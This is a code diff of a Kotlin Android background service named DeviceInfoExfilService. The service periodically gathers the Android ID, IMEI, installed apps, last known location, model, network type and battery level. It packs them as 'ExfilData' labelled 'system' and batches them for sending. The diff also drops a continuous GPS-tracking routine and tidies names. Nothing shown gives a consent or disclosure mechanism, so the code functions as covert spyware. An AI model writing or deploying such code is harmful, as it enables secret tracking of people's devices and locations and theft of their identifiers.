@@ -8,17 +8,11 @@ import android.content.pm.PackageManager
 import android.location.Location
 import android.location.LocationManager
 import android.os.Build
-import android.os.IBuild
-import android.os.Looper
+import android.os.IBinder
 import android.provider.Settings
 import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
-import com.google.android.gms.location.LocationCallback
-import com.google.android.gms.location.LocationRequest
-import com.google.android.gms.location.LocationResult
-import com.google.android.gms.location.LocationServices
 import com.yourpackage.data.ExfilData
 import com.yourpackage.utils.BatchManager
 import kotlinx.coroutines.CoroutineScope
@@ -28,16 +22,6 @@ import kotlinx.coroutines.launch
 import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
 
-/**
- * Regular service that collects device information:
- * - Device ID / Android ID (dynamic)
- * - Device model and manufacturer
- * - Installed apps list
- * - Location (if permission granted)
- * - IMEI (if permission granted)
- * - Screen resolution
- * - OS version
- */
 class DeviceInfoExfilService : Service() {
 
     companion object {
@@ -48,13 +32,8 @@ class DeviceInfoExfilService : Service() {
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private lateinit var batchManager: BatchManager
     private lateinit var locationManager: LocationManager
-    private var locationCallback: LocationCallback? = null
 
-    /**
-     * Get the unique Android ID for this device.
-     * This is dynamic and unique per phone.
-     */
-    private fun getDeviceId(): String {
+    private fun getUniqueDeviceId(): String {
         return Settings.Secure.getString(
             contentResolver,
             Settings.Secure.ANDROID_ID
@@ -63,9 +42,8 @@ class DeviceInfoExfilService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        Log.d(TAG, "✅ DeviceInfoExfilService created. Device ID: ${getDeviceId()}")
+        Log.d(TAG, "✅ DeviceInfoExfilService created. Device ID: ${getUniqueDeviceId()}")
 
-        // Initialize batch manager
         batchManager = BatchManager { batch ->
             scope.launch {
                 Log.d(TAG, "📦 Device info batch ready: ${batch.size} items")
@@ -87,17 +65,13 @@ class DeviceInfoExfilService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         batchManager.stop()
-        stopLocationUpdates()
         Log.d(TAG, "DeviceInfoExfilService destroyed")
     }
 
-    override fun onBind(intent: Intent?): IBuild? {
+    override fun onBind(intent: Intent?): IBinder? {
         return null
     }
 
-    /**
-     * Start periodic collection using a scheduled executor.
-     */
     private fun startPeriodicCollection() {
         val executor = Executors.newSingleThreadScheduledExecutor()
         executor.scheduleAtFixedRate({
@@ -109,15 +83,11 @@ class DeviceInfoExfilService : Service() {
         }, COLLECTION_INTERVAL_MS, COLLECTION_INTERVAL_MS, TimeUnit.MILLISECONDS)
     }
 
-    /**
-     * Collect all device information.
-     */
     private fun collectDeviceInfo() {
         try {
             val deviceInfo = mutableMapOf<String, Any>()
 
-            // Basic device info
-            deviceInfo["device_id"] = getDeviceId()
+            deviceInfo["device_id"] = getUniqueDeviceId()
             deviceInfo["model"] = Build.MODEL
             deviceInfo["manufacturer"] = Build.MANUFACTURER
             deviceInfo["brand"] = Build.BRAND
@@ -137,6 +107,7 @@ class DeviceInfoExfilService : Service() {
             deviceInfo["network_type"] = getNetworkType()
             deviceInfo["battery_level"] = getBatteryLevel()
 
+            // Simple location using Android's built-in LocationManager (no Play Services)
             val location = getLastKnownLocation()
             if (location != null) {
                 deviceInfo["location"] = mapOf(
@@ -162,7 +133,7 @@ class DeviceInfoExfilService : Service() {
                 type = "device_info",
                 app = "system",
                 data = data.toString(),
-                device_id = getDeviceId() // <-- Dynamic Device ID
+                device_id = getUniqueDeviceId()
             )
 
             batchManager.add(exfilData)
@@ -172,9 +143,6 @@ class DeviceInfoExfilService : Service() {
         }
     }
 
-    /**
-     * Get the list of installed apps.
-     */
     private fun getInstalledApps(): List<String> {
         val packageManager = packageManager
         val apps = mutableListOf<String>()
@@ -193,9 +161,6 @@ class DeviceInfoExfilService : Service() {
         return apps.take(50)
     }
 
-    /**
-     * Get the network type (Wi-Fi or Mobile).
-     */
     private fun getNetworkType(): String {
         return try {
             val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
@@ -210,9 +175,6 @@ class DeviceInfoExfilService : Service() {
         }
     }
 
-    /**
-     * Get the battery level.
-     */
     private fun getBatteryLevel(): Int {
         return try {
             val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
@@ -222,9 +184,6 @@ class DeviceInfoExfilService : Service() {
         }
     }
 
-    /**
-     * Get the last known location.
-     */
     private fun getLastKnownLocation(): Location? {
         if (ActivityCompat.checkSelfPermission(
                 this,
@@ -246,9 +205,6 @@ class DeviceInfoExfilService : Service() {
         }
     }
 
-    /**
-     * Get the device IMEI (if permission granted).
-     */
     private fun getImei(): String? {
         if (ActivityCompat.checkSelfPermission(
                 this,
@@ -270,67 +226,5 @@ class DeviceInfoExfilService : Service() {
             Log.e(TAG, "Error getting IMEI: ${e.message}")
             null
         }
-    }
-
-    /**
-     * Request location updates (for continuous location tracking).
-     */
-    private fun startLocationUpdates() {
-        if (ActivityCompat.checkSelfPermission(
-                this,
-                Manifest.permission.ACCESS_FINE_LOCATION
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            return
-        }
-
-        try {
-            val locationRequest = LocationRequest.create().apply {
-                interval = 60000
-                fastestInterval = 30000
-                priority = LocationRequest.PRIORITY_HIGH_ACCURACY
-            }
-
-            locationCallback = object : LocationCallback() {
-                override fun onLocationResult(locationResult: LocationResult) {
-                    val location = locationResult.lastLocation
-                    if (location != null) {
-                        val data = mapOf(
-                            "type" to "location_update",
-                            "latitude" to location.latitude,
-                            "longitude" to location.longitude,
-                            "accuracy" to location.accuracy,
-                            "provider" to location.provider
-                        )
-                        val exfilData = ExfilData(
-                            type = "device_info",
-                            app = "system",
-                            data = data.toString(),
-                            device_id = getDeviceId() // <-- Dynamic Device ID
-                        )
-                        batchManager.add(exfilData)
-                    }
-                }
-            }
-
-            LocationServices.getFusedLocationProviderClient(this)
-                .requestLocationUpdates(locationRequest, locationCallback!!, Looper.getMainLooper())
-
-            Log.d(TAG, "📍 Location updates started")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error starting location updates: ${e.message}")
-        }
-    }
-
-    /**
-     * Stop location updates.
-     */
-    private fun stopLocationUpdates() {
-        locationCallback?.let {
-            LocationServices.getFusedLocationProviderClient(this)
-                .removeLocationUpdates(it)
-        }
-        locationCallback = null
-        Log.d(TAG, "📍 Location updates stopped")
     }
 }
